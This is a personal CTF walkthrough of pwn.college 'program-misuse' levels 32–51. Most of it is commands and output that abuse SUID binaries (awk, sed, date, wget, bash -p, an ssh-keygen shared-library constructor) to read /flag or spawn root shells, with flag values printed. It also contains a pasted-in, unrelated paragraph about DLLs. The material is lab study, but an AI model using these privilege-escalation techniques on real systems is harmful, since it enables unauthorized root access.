---
description: >-
  I heavily heavily leveraged gtfobins for this. Amazing resource for this
  method of privesc
---

# Labs

{% embed url="https://gtfobins.github.io/" %}
The goats
{% endembed %}



This isn't super necessary for these CTF's because they pretty plainly define what command you are supposed to leverage to access the file however in a different environment good commands to search for this are

```
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```

Anyways back to it. I totally forgot to take notes till 32 but here is everything after that :)



```
------------------------------------------------------------------------------
Level 32
socat - OPEN:'your_file_path' && echo "File printed successfully"

------------------------------------------------------------------------------
Level 33
whiptail --textbox "/flag" 20 60

------------------------------------------------------------------------------
Level 34
awk '{print}' /flag 

------------------------------------------------------------------------------
Level 35
sed 'p' /flag

------------------------------------------------------------------------------
Level 36
ed -s /flag <<< $'1,$p\nq'

------------------------------------------------------------------------------
Level 37
hacker@program-misuse~level37:/challenge$ chown hacker /flag
hacker@program-misuse~level37:/challenge$ cat /flag 
pwn.college{cSg-FSNAQ4KorNoW2MOG1dPlNIX.0VO3EDL3QzMzUzW}

------------------------------------------------------------------------------
Level 38
hacker@program-misuse~level38:/challenge$ chmod 777 /flag && cat /flag 
pwn.college{ITaZiw0k9LF8n0hmD2iIuyJc9mf.0FM4EDL3QzMzUzW}

------------------------------------------------------------------------------
Level 39
cp /flag /dev/stdout 
pwn.college{Q282NbsqeX9VlgrPMhYlq1iW-Np.0VM4EDL3QzMzUzW}

------------------------------------------------------------------------------
Level 40
mv /usr/bin/cat /usr/bin/mv
./babysuid_level40 
mv flag
pwn.college{025Q7DYhdfQU2TvXGulk7ylfWkN.0lM4EDL3QzMzUzW}


------------------------------------------------------------------------------

Level 41
#!/usr/bin/perl

use strict;
use warnings;

my $filename = '/flag';

open(my $fh, '<', $filename) or die "Could not open file '$filename' $!";

while (my $line = <$fh>) {
  print $line;
}

close($fh);

pwn.college{Ut08m0FqL4h271TBwqe-DbAQuB5.01M4EDL3QzMzUzW}
------------------------------------------------------------------------------
Level 42
#!/usr/bin/env python

filename = '/flag'

with open(filename, 'r') as file:
    for line in file:
        print(line, end='')

pwn.college{IaUGQKbNqV4y4VX5wyALJmFz9a1.0FN4EDL3QzMzUzW}

------------------------------------------------------------------------------
Level 43
#!/usr/bin/env ruby

filename = '/flag'

File.open(filename, 'r') do |file|
  file.each_line do |line|
    puts line
  end
end

pwn.college{8RwBJ1rk7rusgih2nEUHnvtugTG.0VN4EDL3QzMzUzW}

------------------------------------------------------------------------------
Level 44
Shoutout gtfobins

hacker@program-misuse~level44:/challenge$ bash -p
bash-5.0# whoami
root
bash-5.0# cat /flag
pwn.college{8_Q4uMUq-0xsQD25NeWmjLPX2pR.0lN4EDL3QzMzUzW}

------------------------------------------------------------------------------
Level 45
hacker@program-misuse~level45:/challenge$ LFILE=/date
hacker@program-misuse~level45:/challenge$ date -f $LFILE
date: /date: No such file or directory
hacker@program-misuse~level45:/challenge$ LFILE=/flag
hacker@program-misuse~level45:/challenge$ date -f $LFILE
date: invalid date 'pwn.college{YHXCevbMDeErUTU77VyuwxU3p6F.01N4EDL3QzMzUzW}'

------------------------------------------------------------------------------
Level 46
hacker@program-misuse~level46:/challenge$ LFILE=/flag
hacker@program-misuse~level46:/challenge$ dmesg -rF "$LFILE"
pwn.college{8hUr61upY0KQ86THL71MwmT9eRE.0FO4EDL3QzMzUzW}

------------------------------------------------------------------------------
Level 47
hacker@program-misuse~level47:/challenge$ LFILE=/flag
hacker@program-misuse~level47:/challenge$ wc --files0-from "$LFILE"
wc: 'pwn.college{IVmD1kgvQB0Ltyvg5cWe_TD9Nlg.0VO4EDL3QzMzUzW}'$'\n': No such file or directory

------------------------------------------------------------------------------
Level 48

hacker@program-misuse~level48:/challenge$ LFILE=/flag
hacker@program-misuse~level48:/challenge$ gcc -x c -E "$LFILE"
# 1 "/flag"
# 1 "<built-in>"
# 1 "<command-line>"
# 31 "<command-line>"
# 1 "/usr/include/stdc-predef.h" 1 3 4
# 32 "<command-line>" 2
# 1 "/flag"
pwn.college{gxZElDuqAHjvpcK7vytoOLTMRGz.0FM5EDL3QzMzUzW}

------------------------------------------------------------------------------
Level 49
hacker@program-misuse~level49:/challenge$ LFILE=/flag
hacker@program-misuse~level49:/challenge$ as @$LFILE
Assembler messages:
Error: can't open pwn.college{8_qa3zBGjLHfn_mlKlIsLOVl-C_.0VM5EDL3QzMzUzW} for reading: No such file or directory

------------------------------------------------------------------------------
Level 50
hacker@program-misuse~level50:/challenge$ LFILE=/flag
hacker@program-misuse~level50:/challenge$ wget -i $LFILE
--2024-04-25 16:10:34--  http://pwn.college%7B4beasxvbnctybywwjk-3kfi97oe.0lm5edl3qzmzuzw%7D/
Resolving pwn.college{4beasxvbnctybywwjk-3kfi97oe.0lm5edl3qzmzuzw} (pwn.college{4beasxvbnctybywwjk-3kfi97oe.0lm5edl3qzmzuzw})... failed: Name or service not known.
wget: unable to resolve host address 'pwn.college{4beasxvbnctybywwjk-3kfi97oe.0lm5edl3qzmzuzw}'


So this works but was a false flag. Insteead I popped a shell.

hacker@program-misuse~level50:/challenge$ TF=$(mktemp)
hacker@program-misuse~level50:/challenge$ echo -e '#!/bin/sh -p\n/bin/sh -p 1>&0' >$TF
hacker@program-misuse~level50:/challenge$ ./wget --use-askpass=$TF 0
bash: ./wget: No such file or directory
hacker@program-misuse~level50:/challenge$ wget --use-askpass=$TF 0
Error spawning /tmp/tmp.aQZSW5S7zI: 13
hacker@program-misuse~level50:/challenge$ chmod +x $TF
hacker@program-misuse~level50:/challenge$ wget --use-askpass=$TF 0

pwn.college{4BEAsxVbnCtyBYwWJk-3KfI97Oe.0lM5EDL3QzMzUzW}


Level 50: 


bash-5.0# cat libsshkeygen.c

#include<stdio.h>
#include<stdlib.h>
static void inject() __attribute__((constructor));
void C_GetFunctionList()
{
	printf("euid:%d\n",geteuid());
	sendfile(1,open("/flag",0),0,4096);
	//system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
	char *argvv[]={"bash","-p",NULL};
	execvp("/bin/bash",argvv);
}

Then compile this to a shared library

&nbsp;The task process then executes the functions to be used by the program, and returns the results to the program for display. In our view, it is like the functions of the program itself. After completing the required functions, the DLL stops running and the entire calling process ends. DLL is compiled code, which is not much different from ordinary programs, except that it cannot run independently and needs to be called by the program. The code of the DLL is almost the same as other programs, only the interface and startup mode are different.

gcc -shared -o libsshkeygen.so libsshkeygen.c


hacker@program-misuse~level51:~$ ssh-keygen -D ./libsshkeygen.so
euid:0
pwn.college{8Jd1IldEtXNubRKdqKAW44rgZw2.01M5EDL3QzMzUzW}
```
